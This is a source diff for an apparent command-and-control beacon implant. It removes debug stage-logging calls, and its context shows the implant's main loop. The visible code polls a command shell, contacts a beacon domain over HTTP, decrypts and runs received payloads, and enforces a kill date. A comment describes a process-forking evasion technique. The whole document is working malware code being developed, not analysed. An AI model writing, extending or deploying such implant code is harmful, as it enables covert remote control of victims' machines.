@@ -84,34 +84,8 @@ unsigned int genagentid() {
 }
 
 
-/* ---- BW_DIAG: 阶段标记器（Phase 2 活体诊断，定位 silent-exit 死点） ---- */
-static void bw_diag(const char *stage, long v) {
-	HANDLE h = CreateFileA("C:\\lab\\diag.txt", GENERIC_WRITE, FILE_SHARE_READ,
-		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (h == INVALID_HANDLE_VALUE) return;
-	SetFilePointer(h, 0, NULL, FILE_END);
-	char buf[96]; int n = 0;
-	unsigned int t = GetTickCount();
-	buf[n++] = '[';
-	for (int sh = 28; sh >= 0; sh -= 4) {
-		int d = (t >> sh) & 0xF;
-		buf[n++] = (char)(d < 10 ? '0' + d : 'A' + d - 10);
-	}
-	buf[n++] = ']'; buf[n++] = ' ';
-	while (*stage && n < 70) buf[n++] = *stage++;
-	buf[n++] = ' ';
-	unsigned long uv = (unsigned long)v;
-	if ((long)uv < 0) { buf[n++] = '-'; uv = (unsigned long)(-(long)uv); }
-	char tmp[24]; int m = 0;
-	do { tmp[m++] = (char)('0' + uv % 10); uv /= 10; } while (uv);
-	while (m > 0 && n < 90) buf[n++] = tmp[--m];
-	buf[n++] = '\r'; buf[n++] = '\n';
-	DWORD w; WriteFile(h, buf, n, &w, NULL);
-	CloseHandle(h);
-}
 
 void beacon(LPVOID lpReserved) {
-	bw_diag("enter", 0);
 	/* 4.12 DirtyVanity: fork the pristine nursery clone before ANY
 	 * RPC-capable subsystem (wininet et al) is touched - a later fork
 	 * inherits poisoned runtime state and the payload beacon fastfails
@@ -166,7 +140,6 @@ void beacon(LPVOID lpReserved) {
 	track_memory_add(blob, sizeof(datap), TRACK_MEMORY_CLEANUP_FUNC, FALSE, reinterpret_cast<void (*)(void*)>(data_free));
 	track_memory_add(blob->original, blob->size, TRACK_MEMORY_CLEANUP_FUNC, TRUE, NULL);
 
-	bw_diag("gates", 1);
 	/* 检查终止日期 */
 	if (check_kill_date())
 		safe_exit();
@@ -250,10 +223,8 @@ void beacon(LPVOID lpReserved) {
 			psh_poll(command_shell_callback, MAX_PACKET);
 			if (check_kill_date())
 				command_die(command_shell_callback);
-			bw_diag("udc2_cycle", beacon_cycles);
 		length = udc2_cycle(buffer, MAX_GET);
 			if (length > 0)
-				bw_diag("proc", length);
 				process_payload(buffer, length);
 			if (check_kill_date())
 				safe_exit();
@@ -275,15 +246,12 @@ void beacon(LPVOID lpReserved) {
 		_snprintf(post_url, 256, "%s", submit);
 #endif
 
-		bw_diag("pre_http", beacon_cycles);
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
 		http_init(beacon_domain, port, ua);
-		bw_diag("post_init", (long)port);
 
 		// dlog("beacon.beacon - http_get: %s \n", url);
 		length = http_get(url, &bigsession, buffer, MAX_GET);
-		bw_diag("get_ret", length);
 
 		/* 这是在处理之前解密和验证有效载荷的适当时机 */
 		if (length > 0) {
@@ -292,7 +260,6 @@ void beacon(LPVOID lpReserved) {
 			length = security_decrypt(buffer, length);
 			if (length > 0) {
 				// dlog("beacon.beacon - Response decrypted length: %d \n", length);
-				bw_diag("proc", length);
 				process_payload(buffer, length);
 			} else {
 			    // CS-327: We were unable to decrypt/process the payload...
